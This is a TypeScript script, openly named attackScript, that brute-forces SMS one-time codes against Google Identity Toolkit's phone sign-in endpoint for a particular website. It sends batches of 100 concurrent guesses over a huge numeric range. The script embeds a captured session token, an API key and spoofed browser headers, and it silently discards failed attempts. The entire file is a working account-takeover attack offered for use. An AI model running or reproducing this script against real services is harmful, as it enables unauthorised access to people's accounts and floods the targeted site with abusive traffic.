import axios from 'axios';

async function attackScript(otp: string){

  let data = JSON.stringify({
    "sessionInfo": "AD8T5IuYS8Q9g3Zpw_rK6HzYAw3ayrCfR_1c63B1Botdo-hLzBsm79HpKGaD9V0Cc9NBuyfmrf0ez9-lU19QP5x1PVdwVIJO722xtjFYNK1Hy6jVyDsGWT-Omx0zSIOoAlB28aIyb4IL9_K8qT6WH8Hj08XJryv0pB-z4FQ4LwskRBKw2i6_bKxkldGkvrSpSSexbwv7t2SmWx_mZNJSDmBXtfLyy0BQj-h9w-wLs3o4_fG1ba0dfOVMBwr02CbEvq6QJlGMgdpU",
    "code": otp
  });
  
  let config = {
    method: 'post',
    maxBodyLength: Infinity,
    url: 'https://identitytoolkit.googleapis.com/v1/accounts:signInWithPhoneNumber?key=AIzaSyAI5gTX5VddXvZ5_K4LBYdarrdqdXyaQps',
    headers: { 
      'accept': '*/*', 
      'accept-language': 'en-US,en;q=0.9,hi;q=0.8,tr;q=0.7', 
      'content-type': 'application/json', 
      'origin': 'https://www.kafumi.com', 
      'priority': 'u=1, i', 
      'sec-ch-ua': '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"', 
      'sec-ch-ua-mobile': '?1', 
      'sec-ch-ua-platform': '"Android"', 
      'sec-fetch-dest': 'empty', 
      'sec-fetch-mode': 'cors', 
      'sec-fetch-site': 'cross-site', 
      'user-agent': 'Mozilla/5.0 (Linux; Android 16; Pixel 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Mobile Safari/537.36', 
      'x-browser-channel': 'stable', 
      'x-browser-copyright': 'Copyright 2026 Google LLC. All Rights Reserved.', 
      'x-browser-validation': 'rOajNjfwi3oE/fgT/UhGGlC+5dw=', 
      'x-browser-year': '2026', 
      'x-client-data': 'CKmdygEIlKHLAQiFoM0BCI7ylDAIl/KUMA==', 
      'x-client-version': 'Chrome/JsCore/12.3.0/FirebaseCore-web', 
      'x-firebase-gmpid': '1:933115416684:web:5ac53d61ae29199f434849', 
      'x-sec-ch-ua-not-a-border': 'bvbvssacqxwgzvrraxvfwtvvqfaxcwbe'
    },
    data : data
  };
  
  try{
    await axios.request(config);
  }catch(e){

  };

}

async function main(){
  for(let i = 100000; i < 999999999; i += 100){
    console.log(i);
      const p = [];
      for(let j = 0; j < 100; j++){
          p.push(attackScript((i+j).toString()));
      }
      await Promise.all(p);
  }
}

main();